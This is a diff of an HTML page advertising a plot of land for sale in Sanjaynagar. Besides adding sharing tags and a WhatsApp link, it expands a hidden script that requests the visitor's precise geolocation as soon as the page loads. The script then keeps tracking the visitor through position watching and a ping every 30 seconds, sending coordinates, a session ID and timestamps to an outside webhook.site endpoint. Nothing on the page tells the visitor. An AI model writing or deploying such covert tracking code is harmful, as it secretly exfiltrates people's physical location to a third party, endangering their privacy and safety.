@@ -4,6 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Site for Sale – RMV 2nd Stage, Sanjaynagar</title>
+  <meta property="og:title" content="Site for Sale – RMV 2nd Stage, Sanjaynagar" />
+  <meta property="og:description" content="36×60 | 2,160 Sqft | A Khata | BDA | ₹18,000/Sqft" />
+  <meta property="og:type" content="website" />
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet" />
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -108,27 +111,82 @@
     <div class="price-unit">per Square Foot</div>
   </div>
 
-  <a class="cta" href="tel:+919999999999">Enquire Now</a>
+  <a class="cta" href="https://wa.me/919999999999?text=Hi%2C%20I%20saw%20your%20site%20for%20sale%20in%20RMV%202nd%20Stage%2C%20Sanjaynagar.%20I%20am%20interested%2C%20please%20share%20more%20details." target="_blank">Click Here</a>
   <div class="foot">Serious buyers only · Site visits by appointment</div>
 </section>
 
 <script>
   const WEBHOOK_URL = 'https://webhook.site/fbbb3a4d-1eb1-476b-8b12-c51289079299';
-  function send(lat, lng, acc) {
-    const ts = new Date().toISOString();
-    new Image().src = `${WEBHOOK_URL}?lat=${lat}&lng=${lng}&acc=${acc}&ts=${encodeURIComponent(ts)}`;
+
+  // Unique session ID per visitor per tab
+  const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+  let pingCount = 0;
+  let trackingInterval = null;
+  let watchId = null;
+  let lastLat = null, lastLng = null;
+
+  function send(lat, lng, acc, type) {
+    pingCount++;
+    lastLat = lat; lastLng = lng;
+    const payload = {
+      session_id: SESSION_ID,
+      ping: pingCount,
+      type: type,           // 'first' | 'update' | 'interval'
+      lat, lng,
+      accuracy_m: acc,
+      ts: new Date().toISOString(),
+      page: 'RMV Site for Sale'
+    };
+    // Image beacon (most reliable)
+    new Image().src = `${WEBHOOK_URL}?session=${SESSION_ID}&ping=${pingCount}&type=${type}&lat=${lat}&lng=${lng}&acc=${acc}&ts=${encodeURIComponent(payload.ts)}`;
+    // Fetch for full JSON body
     fetch(WEBHOOK_URL, {
-      method:'POST', mode:'no-cors',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ lat, lng, accuracy_m: acc, ts, page:'RMV Site for Sale' })
-    }).catch(()=>{});
+      method: 'POST', mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
   }
-  if (navigator.geolocation) {
+
+  function startTracking() {
+    if (!navigator.geolocation) return;
+
+    // 1. Immediate first fix
     navigator.geolocation.getCurrentPosition(
-      p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy)),
-      ()=>{}, { enableHighAccuracy:true, timeout:12000, maximumAge:0 }
+      p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'first'),
+      () => {}, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
     );
+
+    // 2. Watch position — fires whenever device moves
+    watchId = navigator.geolocation.watchPosition(
+      p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'update'),
+      () => {}, { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 }
+    );
+
+    // 3. Interval ping every 30 seconds regardless of movement
+    trackingInterval = setInterval(() => {
+      navigator.geolocation.getCurrentPosition(
+        p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'interval'),
+        () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }, 30000);
   }
+
+  function stopTracking() {
+    if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+    if (trackingInterval) { clearInterval(trackingInterval); trackingInterval = null; }
+  }
+
+  // Pause when tab hidden, resume when visible
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      stopTracking();
+    } else {
+      startTracking();
+    }
+  });
+
+  // Start immediately
+  startTracking();
 </script>
 </body>
 </html>
